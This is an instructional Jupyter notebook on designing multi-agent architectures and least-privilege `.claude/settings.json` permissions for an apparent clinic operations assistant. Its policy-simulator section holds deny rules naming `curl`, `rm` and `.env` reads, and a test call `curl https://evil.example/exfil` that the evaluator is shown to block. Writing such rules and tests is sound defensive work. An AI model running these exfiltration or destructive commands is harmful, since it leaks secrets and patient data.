# Deep Dive: Agentic Architecture & Claude Code Configuration

## 📋 Summary

Before writing a single line of agent code, strong AI engineers design the **architecture** (single-agent vs workflow vs multi-agent, tool boundaries, model tiers, and failure handling) and encode that design declaratively.

In this notebook (covering **Lessons 03–04**: Agentic Architecture and Claude Code Configuration), you will design a **Healthcare Clinic Operations Assistant**, compare architectural topologies, model `.claude/` configuration artifacts (`CLAUDE.md`, `.claude/agents/*.md`, `.claude/settings.json`), and build a Python **Config & Permission Policy Simulator** that enforces least-privilege tool access before any agent runs.

### Key concepts in this notebook

| # | Concept | Complexity |
|---|---|---|
| 1 | Single-Agent vs Workflow vs Multi-Agent trade-offs | 🟢 Beginner |
| 2 | Designing an agent roster (responsibility, tools, model tier) | 🟢 Beginner |
| 3 | Anatomy of `.claude/` (`CLAUDE.md`, `agents/*.md`, `skills/*/SKILL.md`) | 🟡 Intermediate |
| 4 | Least-privilege security with `.claude/settings.json` (`allow` / `deny`) | 🟡 Intermediate |
| 5 | Programmatic config validation & architecture critique with Claude | 🔴 Advanced |
| 6 | Hands-on architecture & config exercises | 🏋️ Practice |

> **How to use this notebook:** Sections 1–4 run completely offline (no API cost). Section 5 uses the Anthropic API to critique your architecture. Cells with `# TODO` are exercises.

## 0. Setup

In [ ]:
%pip install -q anthropic pyyaml

import fnmatch
import json
import os
import re
from dataclasses import dataclass, field
from getpass import getpass
import yaml

try:
    from google.colab import userdata
    os.environ["ANTHROPIC_API_KEY"] = userdata.get("ANTHROPIC_API_KEY")
except Exception:
    if not os.environ.get("ANTHROPIC_API_KEY"):
        os.environ["ANTHROPIC_API_KEY"] = getpass("Enter your ANTHROPIC_API_KEY (or press Enter to skip API cells): ")

import anthropic

client = anthropic.Anthropic() if os.environ.get("ANTHROPIC_API_KEY") else None
MODEL_FAST = "claude-haiku-4-5-20251001"
MODEL_SMART = "claude-sonnet-4-5-20250929"
print("Setup complete. API client ready:", client is not None)

## 1. Choosing the Right Topology: Single vs Workflow vs Multi-Agent 🟢

Lesson 03 emphasizes **starting simple** and only adding multi-agent complexity when specialization, parallelism, or context isolation genuinely pays off:

| Pattern | When to Use | Pros | Cons |
|---|---|---|---|
| **Single Agent** | Simple, cohesive tasks with few tools | Lowest latency, trivial debugging, single context | Context bloat, weak specialization, sequential only |
| **Fixed Workflow** | Predictable multi-step pipelines (A → B → C) | Deterministic, easy to test & budget | Rigid when inputs vary unpredictably |
| **Multi-Agent (Orchestrator + Specialists)** | Independent subtasks, strict tool isolation, mixed model tiers | Parallel execution, least-privilege tools, clean contexts | Coordination overhead, multiple API calls, merge logic |

Let's model our **Healthcare Clinic Operations Assistant** (handles appointment intake, insurance verification, and clinical prep checklists) as a structured architecture spec.

In [ ]:
@dataclass
class AgentSpec:
    name: str
    responsibility: str
    tools: list[str]
    model: str  # "haiku", "sonnet", or "opus"
    can_write: bool = False


clinic_architecture = [
    AgentSpec(
        name="clinic-orchestrator",
        responsibility="Receives patient intake requests, delegates to specialists, merges final readiness brief",
        tools=["Task"],
        model="sonnet",
    ),
    AgentSpec(
        name="insurance-verifier",
        responsibility="Checks coverage rules and co-pay tables from policy docs",
        tools=["Read", "Grep"],
        model="haiku",
    ),
    AgentSpec(
        name="prep-checklist-builder",
        responsibility="Builds visit prep instructions from clinic procedure guides",
        tools=["Read", "Glob"],
        model="haiku",
    ),
]

for a in clinic_architecture:
    print(f"- {a.name:24s} | model={a.model:6s} | tools={a.tools}")

### 🧐 Observation
- Why does `clinic-orchestrator` use **Sonnet** while `insurance-verifier` and `prep-checklist-builder` use **Haiku**?
- Notice none of these agents have `Bash` or `Write` — tool restriction is an architectural decision, not an afterthought.

## 2. Generating Architecture Diagrams (Mermaid) 🟢

In Lesson 03, every architecture is documented with Mermaid diagrams (`single-agent.mmd`, `multi-agent.mmd`, `workflow.mmd`, `sequence.mmd`) so teammates can review data flow and failure paths before coding.

In [ ]:
def generate_orchestrator_mermaid(agents: list[AgentSpec]) -> str:
    orch = agents[0]
    workers = agents[1:]
    lines = ["flowchart TD", f'    User["Patient Intake Request"] --> Orch["{orch.name} ({orch.model})"]']
    for i, w in enumerate(workers, 1):
        node = f"W{i}"
        tools_str = ", ".join(w.tools)
        lines.append(f'    Orch --> {node}["{w.name} ({w.model})\\nTools: {tools_str}"]')
        lines.append(f'    {node} --> Merge["Compile Readiness Brief"]')
    return "\n".join(lines)


mermaid_src = generate_orchestrator_mermaid(clinic_architecture)
print(mermaid_src)

## 3. Declarative Configuration in `.claude/` 🟡

Lesson 04 shows how an entire multi-agent architecture can be expressed declaratively in `.claude/` without writing orchestration boilerplate:

```
project/
└── .claude/
    ├── CLAUDE.md                     # Project-wide rules, conventions, routing instructions
    ├── settings.json                 # Tool allow/deny permissions & env vars
    ├── agents/
    │   ├── insurance-verifier.md     # Subagent: YAML frontmatter (name, description, tools, model) + prompt
    │   └── prep-checklist-builder.md
    └── skills/
        └── coverage-rules/
            └── SKILL.md              # Reusable domain methodology loaded automatically by description
```

Let's parse and validate subagent Markdown files with YAML frontmatter in Python — the exact same structure Claude Code reads.

In [ ]:
SAMPLE_SUBAGENT_MD = """---
name: insurance-verifier
description: Verifies patient insurance eligibility and co-pay rules against clinic payer manuals. Use when checking coverage for an upcoming visit.
tools: Read, Grep
model: haiku
---

# Insurance Verifier

You verify insurance coverage rules using only the clinic's local payer manuals in `docs/payers/`.

## Output Format
Return:
1. Coverage status (`COVERED`, `PRIOR_AUTH_REQUIRED`, `OUT_OF_NETWORK`)
2. Estimated co-pay
3. Exact policy citation (filename + section)
"""


def parse_frontmatter_md(md_text: str) -> tuple[dict, str]:
    match = re.match(r"^---\s*\n(.*?)\n---\s*\n(.*)$", md_text, re.DOTALL)
    if not match:
        raise ValueError("Missing YAML frontmatter delimited by ---")
    meta = yaml.safe_load(match.group(1))
    body = match.group(2).strip()
    return meta, body


def validate_subagent(md_text: str) -> list[str]:
    errors = []
    try:
        meta, body = parse_frontmatter_md(md_text)
    except ValueError as e:
        return [str(e)]
    for required in ("name", "description", "tools"):
        if not meta.get(required):
            errors.append(f"Missing required frontmatter field: {required}")
    if meta.get("model") and meta["model"] not in ("haiku", "sonnet", "opus", "inherit"):
        errors.append(f"Invalid model tier: {meta['model']}")
    if len(body) < 40:
        errors.append("System prompt body is too short to guide the subagent")
    return errors


meta, body = parse_frontmatter_md(SAMPLE_SUBAGENT_MD)
print("Parsed metadata:", meta)
print("Validation errors:", validate_subagent(SAMPLE_SUBAGENT_MD))

### 🧐 Observation
- Notice how the `description` field is **the trigger**: Claude Code decides *when* to delegate to a subagent (or load a skill) by matching the user's request against `description`. Vague descriptions cause missed delegations.

## 4. Enforcing Least-Privilege Permissions (`settings.json`) 🟡

In Lesson 04's solution, `.claude/settings.json` explicitly pairs an `allow` list with a `deny` list — blocking `.env`, `secrets/**`, `WebFetch`, `Bash(rm:*)`, and `Bash(curl:*)`. **Deny always wins over allow.**

Let's build a miniature policy evaluator to test permission rules against real tool invocations.

In [ ]:
SETTINGS_JSON = {
    "permissions": {
        "allow": [
            "Read(docs/**)",
            "Read(intake/**)",
            "Bash(ls:*)",
            "Bash(grep:*)",
        ],
        "deny": [
            "Read(.env)",
            "Read(.env.*)",
            "Read(patient_phi/**)",
            "WebFetch",
            "Bash(rm:*)",
            "Bash(curl:*)",
            "Write(config/**)",
        ],
    }
}


def rule_matches(rule: str, tool: str, arg: str = "") -> bool:
    """Match rules like 'WebFetch', 'Read(docs/**)', or 'Bash(rm:*)'."""
    if "(" not in rule:
        return rule == tool
    r_tool, pattern = rule.split("(", 1)
    pattern = pattern.rstrip(")")
    if r_tool != tool:
        return False
    if r_tool == "Bash" and pattern.endswith(":*"):
        prefix = pattern[:-2]
        return arg.strip().startswith(prefix)
    return fnmatch.fnmatch(arg, pattern)


def evaluate_permission(settings: dict, tool: str, arg: str = "") -> str:
    perms = settings.get("permissions", {})
    for rule in perms.get("deny", []):
        if rule_matches(rule, tool, arg):
            return f"DENY (matched {rule})"
    for rule in perms.get("allow", []):
        if rule_matches(rule, tool, arg):
            return f"ALLOW (matched {rule})"
    return "ASK (not explicitly allowed or denied)"


test_calls = [
    ("Read", "docs/payers/bluecross.md"),
    ("Read", ".env.production"),
    ("Read", "patient_phi/record_991.json"),
    ("Bash", "grep -i copay docs/payers/bluecross.md"),
    ("Bash", "curl https://evil.example/exfil"),
    ("WebFetch", "https://example.com"),
    ("Write", "intake/summary.md"),
]

for tool, arg in test_calls:
    print(f"{tool:8s}({arg:40s}) -> {evaluate_permission(SETTINGS_JSON, tool, arg)}")

### 🧐 Observation
- Why should `evaluate_permission` check `deny` *before* `allow`?
- What happens to `Write(intake/summary.md)`? It falls through to `ASK` (human approval) — safe by default!

## 5. Architecture Critique & Failure Modes 🔴

Let's use Claude to review our architecture spec for blind spots, and review the most common architectural failure modes.

In [ ]:
if client:
    arch_summary = "\n".join(
        f"- {a.name} ({a.model}): {a.responsibility} | tools={a.tools}"
        for a in clinic_architecture
    )
    resp = client.messages.create(
        model=MODEL_SMART,
        max_tokens=500,
        system="You are a staff AI systems architect. Give 3 sharp, concrete critiques of this multi-agent design (latency, failure handling, or security).",
        messages=[{"role": "user", "content": arch_summary}],
    )
    print(resp.content[0].text)
else:
    print("Skipped API call (no ANTHROPIC_API_KEY set).")

### Common Failure Modes & Fixes

| Failure Mode | Why It Happens | Fix |
|---|---|---|
| Over-engineered multi-agent setup | Splitting a simple task into 4 agents adds 4x latency and merge bugs | Start single-agent; split only when tools, context, or model tiers diverge |
| Over-privileged subagents | Giving every subagent `Bash` and `Write` by default | Restrict `tools:` in each subagent's frontmatter to the minimum needed |
| Silent secret exfiltration | Allowing `Read(**)` or `Bash(*)` without a `deny` list | Explicitly deny `.env*`, `secrets/**`, `curl`, and external `WebFetch` |
| Uninvoked subagents / skills | Vague `description:` frontmatter | Write crisp trigger phrases: *"Use when..."* with concrete domain nouns |

## 6. Exercises 🏋️

### Exercise 1: Design a 3-Agent Architecture for a Software Release Pipeline
Define 3 `AgentSpec` objects (an orchestrator + 2 specialists: e.g. `changelog-writer` and `security-auditor`) with appropriate model tiers and least-privilege tools, then print their Mermaid diagram.

In [ ]:
# TODO: Replace with your 3 AgentSpec definitions
release_architecture: list[AgentSpec] = [
    # AgentSpec(name=..., responsibility=..., tools=..., model=...)
]

if release_architecture:
    print(generate_orchestrator_mermaid(release_architecture))
else:
    print("Fill in release_architecture above to render the Mermaid diagram.")

### Exercise 2: Author and Validate a Subagent `.md` File
Write a valid `.claude/agents/security-auditor.md` string with YAML frontmatter (`name`, `description`, `tools`, `model`) and a focused system prompt, then verify `validate_subagent(...)` returns `[]`.

In [ ]:
MY_SUBAGENT_MD = """---
name: ""
description: ""
tools: ""
model: ""
---

# TODO: Write the subagent prompt here
"""

# TODO: Complete MY_SUBAGENT_MD so validate_subagent returns an empty list
print("Validation errors:", validate_subagent(MY_SUBAGENT_MD))

### Exercise 3: Harden `settings.json`
Extend `SETTINGS_JSON` so that `Write(docs/reports/**)` is allowed, while `Write(docs/payers/**)` and `Bash(git push:*)` are explicitly denied. Test both cases with `evaluate_permission`.

In [ ]:
hardened_settings = json.loads(json.dumps(SETTINGS_JSON))

# TODO: Update hardened_settings["permissions"]["allow"] and ["deny"]

for tool, arg in [
    ("Write", "docs/reports/2026-01.md"),
    ("Write", "docs/payers/bluecross.md"),
    ("Bash", "git push origin main"),
]:
    print(f"{tool}({arg}) -> {evaluate_permission(hardened_settings, tool, arg)}")

## 🏁 Summary & Key Takeaways

- **Architecture before code:** Decide between single-agent, fixed workflow, and multi-agent based on specialization, parallelism, and tool isolation.
- **Declarative `.claude/` configs:** `CLAUDE.md` sets project conventions, `agents/*.md` defines isolated specialists with scoped tools/models, and `skills/*/SKILL.md` encodes reusable domain methods.
- **Deny wins over allow:** Always lock down `.env*`, credentials, destructive shell commands, and unexpected network egress in `settings.json`.

### What's next?
Continue to **`deep-dive-3-agent-sdk-and-custom-tools.ipynb`** to build a production-grade `stop_reason`-driven agentic loop with budgets, audit traces, and custom tools.